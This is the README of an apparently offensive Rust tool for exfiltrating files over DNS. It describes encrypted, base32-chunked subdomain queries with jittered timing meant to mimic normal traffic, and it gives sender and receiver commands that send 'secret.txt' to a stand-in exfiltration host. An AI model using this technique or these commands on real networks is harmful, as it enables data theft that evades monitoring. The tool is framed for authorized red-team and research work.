# Covert Exfil – DNS Covert Channel Framework

**Educational/research project** demonstrating a covert data exfiltration channel using DNS queries.

**Important legal & ethical notice**  
This code is provided **strictly for educational purposes**, red team/blue team exercises, CTF challenges, security research, and authorized penetration testing **with explicit written permission** from the network owner.  
Any unauthorized use, real-world data theft, or violation of laws (including but not limited to computer fraud/abuse acts) is **strictly prohibited**. Use only in controlled lab environments or with proper authorization.

## Overview

This project implements a simple but effective **covert channel** for exfiltrating files/text through DNS queries:

- Data is compressed (optional), encrypted with **AES-256-GCM**, encoded in **base32** (no padding)
- Split into chunks of **56 characters** (multiple of 8 → no trailing bits issues)
- Sent as subdomains in DNS queries to a controlled domain
- Rate-limited with jittered delays to mimic legitimate traffic
- Receiver runs a local DNS server on port 5371, collects chunks, reassembles, decrypts and saves the file
- Supports UTF-8 and UTF-16LE text recovery (useful for non-English content)

## Features

- AES-256-GCM encryption + random nonce
- Base32 encoding without padding
- Chunk size 56 characters (35 bytes) to avoid base32 decoding errors
- Jittered delay between queries (400–1800 ms)
- Automatic text encoding detection (UTF-8 / UTF-16LE)
- Raw file saving + console output
- ICMP listener (basic payload logging)

## Requirements

- Rust 1.70+
- Cargo


## Installation

```bash
git clone https://github.com/yourusername/covert-exfil.git
cd covert-exfil
```
## Usage

## 1. Start the receiver
```bash
cargo run -- --bind 203.0.113.42 --port 5371
```

## 2. Start the sender
```bash
cargo run -- -f secret.txt --server 203.0.113.42:5371
# or with domain name
cargo run -- -f secret.txt --server exfil.yourdomain.com:5371
```


